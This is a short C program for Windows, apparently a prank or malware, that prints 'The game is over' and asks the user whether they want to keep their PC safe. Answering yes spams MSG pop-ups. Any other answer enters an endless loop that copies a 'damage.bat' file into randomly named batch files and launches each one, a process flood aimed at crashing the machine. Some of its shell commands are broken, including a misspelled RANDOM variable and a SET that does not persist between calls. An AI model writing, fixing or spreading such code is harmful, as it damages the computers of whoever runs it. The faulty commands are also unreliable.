#include<stdio.h>
#include<stdlib.h>
#include<string.h>

void death(){
	int a=0;
	while(a<2){
		system("SET /A x=%RANDOW%%%1999999999%");
		system("TYPE damage.bat >> %x%.bat");
		system("START %x%.bat");
		
	}
}
void demostration(){
	for(int i = 0; i <= 100; i++){
		system("MSG * Be careful in the next time.");
		system("\a\a");
	};
}


int main(){
    char answer; 


    puts("The game is over, sorry");
	printf("You want keep your PC safely?[Y/N] ");
	answer=getchar();

	switch (answer){
		case 'y':
			puts("Ok, i will be careful now!");
			demostration();
			break;
		case 'Y':
			puts("Ok, i will be careful now!");
			demostration();
			break;
		case 'N':
			puts("OH, it's a pity men, i tried help you!");
			puts("Prepared to the show?\nLets do it!!");
			death();
			break;
		case 'n':
			puts("OH, it's a pity men, i tried help you!");
			puts("Prepared to the show?\nLets do it!!");
			death();
			break;
		default:
			printf("Invalid sentence! I will kill you any way.");
			death();
			break;
	};


	return 0;

}